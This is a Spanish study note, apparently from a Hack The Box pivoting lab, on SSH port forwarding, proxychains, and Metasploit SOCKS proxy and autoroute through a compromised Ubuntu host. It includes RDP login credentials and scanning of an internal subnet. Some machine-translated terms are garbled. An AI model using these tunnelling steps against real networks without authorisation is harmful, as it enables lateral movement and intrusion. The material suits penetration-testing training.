![[Pasted image 20240605151052.png]]
#### Ejecución del reenvío de puerto local por ssh
```python
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

#### Reenvío de múltiples puertos

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

#### Habilitación del reenvío dinámico de puertos con SSH

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
G41i130Q@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64

	# nota: de esta manera podemos enviar todo el trafico de la maquina numero 3 (maquina final) hacia nuestra maquina por el puerto 9050 que esta configurado usando el proxychains
```

#### Enumeración del destino de Windows a través de Proxychains

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
proxychains nmap -v -Pn -sT 172.16.5.19
```

#### Usando xfreerdp con Proxychains

Reenvío dinámico de puertos con túnel SSH y SOCKS

```python
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

#### Configuración del proxy SOCKS de MSF

Túneles y reenvío de puertos de Meterpreter

```python
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

Después de iniciar el servidor SOCKS, configuraremos cadenas proxy para enrutar el tráfico generado por otras herramientas como Nmap a través de nuestro pivote en el host Ubuntu comprometido. Podemos agregar la siguiente línea al final de nuestro `proxychains.conf` archivo ubicado en `/etc/proxychains.conf` si no está ya allí.

#### Agregar una línea a proxychains.conf si es necesario

Túneles y reenvío de puertos de Meterpreter

```shell-session
socks4 	127.0.0.1 9050
```

Nota: Dependiendo de la versión que esté ejecutando el servidor SOCKS, es posible que ocasionalmente necesitemos cambiar calcetines4 a calcetines5 en proxychains.conf.

Finalmente, necesitamos decirle a nuestro módulo calcetines_proxy que enrute todo el tráfico a través de nuestra sesión de Meterpreter. Podemos usar el `post/multi/manage/autoroute` Módulo de Metasploit para agregar rutas para la subred 172.16.5.0 y luego enrutar todo el tráfico de nuestras cadenas de proxy.

#### Crear rutas con AutoRoute

Túneles y reenvío de puertos de Meterpreter

```python
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

También es posible agregar rutas con autorruta ejecutando autoroute desde la sesión de Meterpreter.

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

Después de agregar las rutas necesarias, podemos usar el `-p` opción para enumerar las rutas activas para asegurarnos de que nuestra configuración se aplique como se esperaba.

#### Listado de rutas activas con AutoRoute

Túneles y reenvío de puertos de Meterpreter

```python
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

Como puede ver en el resultado anterior, la ruta se agregó a la red 172.16.5.0/23. Ahora podremos usar cadenas proxy para enrutar nuestro tráfico de Nmap a través de nuestra sesión de Meterpreter.